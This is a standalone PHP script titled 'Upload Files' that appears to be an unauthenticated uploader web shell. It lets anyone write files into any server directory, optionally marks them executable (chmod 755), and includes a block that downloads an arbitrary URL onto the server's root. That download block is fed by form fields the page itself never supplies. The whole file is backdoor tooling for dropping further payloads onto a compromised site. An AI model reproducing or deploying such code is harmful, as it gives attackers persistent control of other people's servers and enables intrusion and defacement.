<?php
echo '<html>
<head>
<title>Upload Files&trade;</title> 
</head>
';
if(isset($_POST['upload'])){
$dir = $_POST['dir'];
$ch = $_POST['chmod'];
foreach($_FILES['file']['name'] as $key=>$val) {
$name=$_FILES['file']['name'][$key];
$tmp=$_FILES['file']['tmp_name'][$key]; 
if(trim($name)!='') {
if(move_uploaded_file($tmp,$dir.'/'.$name)) {
if($ch == 'yes') {
$chmod = chmod($dir.'/'.$name,0755);
echo '<br/>Upload => '.$name.'Sukses !
<br/>
Chmod 755 => Sukses !'; 
} else {
echo '<br/>Upload => '.$name.'Sukses !'; 
}
} else {
echo '<br/>Upload => '.$name.'Failed'; 
}
}
}
}
$time=time();
$gmt='+7';
$jm='3600';
$var=$time+($gmt*$jm);
$now=gmdate('Y',$var);
?>
<form method="post"enctype="multipart/form-data"action="">
<table>
<tr>
<td>Upload File :</td>
</tr><tr>
<td><input type="file"name="file[]"/><td/>
</tr><tr>
<td><input type="file"name="file[]"/><td/>
</tr><tr>
<td><input type="file"name="file[]"/><td/>
</tr><tr>
<td>Auto Chmod 755 <select name="chmod"><option value="no">No</option><option value="yes">Yes</option></select></td>
</tr><tr>
<td>Upload To /</td>
</tr><tr>
<td><input name="dir" type="text" value="<?php echo dirname(__FILE__); ?>"></td>
</tr><tr>
<td><input type="submit"name="upload"value="Upload"/></td>
</tr>
</table>
</form>
<br/>
<?php

// maximum execution time in seconds
set_time_limit (24 * 60 * 60);

if (!isset($_POST['submit'])) die();

// folder to save downloaded files to. must end with slash
$destination_folder = '/';

$url = $_POST['url'];
$newfname = $destination_folder . basename($url);

$file = fopen ($url, "rb");
if ($file) {
$newf = fopen ($newfname, "wb");

if ($newf)
while(!feof($file)) {
fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 );
}
}

if ($file) {
fclose($file);
}

if ($newf) {
fclose($newf);
}

?>